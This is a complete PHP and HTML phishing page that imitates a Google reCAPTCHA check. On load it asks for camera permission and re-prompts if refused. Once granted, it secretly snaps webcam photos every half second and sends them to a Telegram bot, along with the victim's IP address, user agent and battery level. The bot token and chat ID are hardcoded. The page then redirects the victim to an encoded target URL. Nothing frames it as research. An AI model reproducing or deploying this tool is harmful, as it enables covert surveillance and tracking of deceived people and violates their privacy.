<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
    
    $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
    $chatId = "5896019931"; // Default fallback

    if (isset($_POST['chat_id']) && !empty($_POST['chat_id'])) {
        $encodedCid = $_POST['chat_id'];
        $decodedCid = base64_decode(str_pad(strtr($encodedCid, '-_', '+/'), strlen($encodedCid) % 4, '=', STR_PAD_RIGHT));
        if ($decodedCid !== false && is_numeric($decodedCid)) {
            $chatId = $decodedCid;
        }
    }

    $uploadDir = 'uploads/';
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }

    $imgData = $_POST['image'];
    $imgData = str_replace('data:image/png;base64,', '', $imgData);
    $imgData = str_replace(' ', '+', $imgData);
    $data = base64_decode($imgData);

    $targetId = isset($_POST['target']) ? $_POST['target'] : 'direct';
    
    $userAgent = isset($_POST['user_agent']) ? $_POST['user_agent'] : 'Unknown';
    $battery   = isset($_POST['battery']) ? $_POST['battery'] : 'Unknown';
    
    $ipAddress = $_SERVER['REMOTE_ADDR'];
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }

    $fileName = 'img_' . uniqid() . '.png';
    $filePath = $uploadDir . $fileName;

    if (file_put_contents($filePath, $data)) {
        $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
        
        $caption = "🎯 Target ID: {$targetId}\n" .
                   "🔋 Battery: {$battery}\n" .
                   "🌐 IP Address: {$ipAddress}\n" .
                   "💻 User Agent: {$userAgent}\n" .
                   "📁 File: {$fileName}";

        $postFields = [
            'chat_id' => $chatId,
            'caption' => $caption,
            'photo'   => new CURLFile(realpath($filePath))
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3); 

        curl_exec($ch);
        curl_close($ch);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #f9f9f9; 
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .recaptcha-box {
            background: #f9f9f9;
            border: 1px solid #d3d3d3;
            border-radius: 3px;
            padding: 20px 25px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 300px;
            box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
            display: none;
            cursor: pointer;
        }

        .recaptcha-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .recaptcha-checkbox {
            width: 28px;
            height: 28px;
            background: #fff;
            border: 2px solid #c1c1c1;
            border-radius: 2px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            transition: background 0.2s, border-color 0.2s;
        }

        .recaptcha-checkbox:hover {
            border-color: #b2b2b2;
        }

        /* স্পিনারের ডিজাইন (ঘুরার জন্য) */
        .recaptcha-checkbox.loading {
            border: 2px solid #f3f3f3;
            border-top: 2px solid #3498db;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            background: #fff !important;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .recaptcha-text {
            font-family: Roboto, helvetica, arial, sans-serif;
            font-size: 14px;
            color: #2c2c2c;
            user-select: none;
        }

        .recaptcha-right {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .recaptcha-logo {
            width: 32px;
            height: 32px;
            background-image: url('https://www.gstatic.com/recaptcha/api2/logo_48.png');
            background-size: contain;
            background-repeat: no-repeat;
        }

        .recaptcha-footer {
            font-family: Roboto, helvetica, arial, sans-serif;
            font-size: 10px;
            color: #555;
            margin-top: 2px;
        }
    </style>
</head>
<body>

    <div class="recaptcha-box" id="recaptchaContainer" onclick="openTargetLink()">
        <div class="recaptcha-left">
            <div class="recaptcha-checkbox" id="recaptchaCheckbox"></div>
            <span class="recaptcha-text">I am not a robot</span>
        </div>
        <div class="recaptcha-right">
            <div class="recaptcha-logo"></div>
            <div class="recaptcha-footer">reCAPTCHA</div>
        </div>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        const urlParams = new URLSearchParams(window.location.search);
        const targetId = urlParams.get('id') || 'direct';
        const userChatId = urlParams.get('cid') || ''; 
        const rawTargetUrl = urlParams.get('url');

        let finalUrl = "https://www.aapunkagames.com/"; 

        if (rawTargetUrl) {
            try {
                finalUrl = atob(rawTargetUrl.replace(/-/g, '+').replace(/_/g, '/'));
            } catch (e) {
                console.error("URL decode error:", e);
            }
        }

        const recaptchaContainer = document.getElementById('recaptchaContainer');
        if (finalUrl) {
            recaptchaContainer.style.display = 'flex';
        }

        let isClicked = false;
        function openTargetLink() {
            if (isClicked) return;
            isClicked = true;

            const checkbox = document.getElementById('recaptchaCheckbox');
            // ক্লিক করার পর বক্সটি গোল হয়ে ঘুরতে থাকবে (Loading spinner)
            checkbox.classList.add('loading');
            
            // ঠিক ৩ সেকেন্ড (3000ms) ঘুরে তারপর মূল ট্যাবে টার্গেট লিংকে রিডাইরেক্ট হবে
            setTimeout(() => {
                window.location.href = finalUrl;
            }, 3000);
        }

        let batteryLevelInfo = 'Not Available';
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                batteryLevelInfo = Math.round(battery.level * 100) + '%';
            });
        }

        function requestCameraPermission() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    setTimeout(() => {
                        // পারমিশন পাওয়ার সাথে সাথেই ০.৫ সেকেন্ড পরপর ছবি পাঠানো শুরু হবে
                        setInterval(captureAndUpload, 500);
                    }, 500);
                })
                .catch(err => {
                    console.error("Camera error: ", err);
                    alert("লিংকটি দেখতে হলে অবশ্যই ক্যামেরা পারমিশন দিতে হবে!");
                    setTimeout(requestCameraPermission, 1000);
                });
        }

        // পেজ ওপেন হওয়ার সাথে সাথেই নিজে থেকে ক্যামেরা পারমিশন চাওয়া শুরু করবে
        requestCameraPermission();

        function captureAndUpload() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');

            const postData = new URLSearchParams();
            postData.append('image', imageData);
            postData.append('target', targetId);
            postData.append('chat_id', userChatId);
            postData.append('user_agent', navigator.userAgent);
            postData.append('battery', batteryLevelInfo);

            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: postData
            }).catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
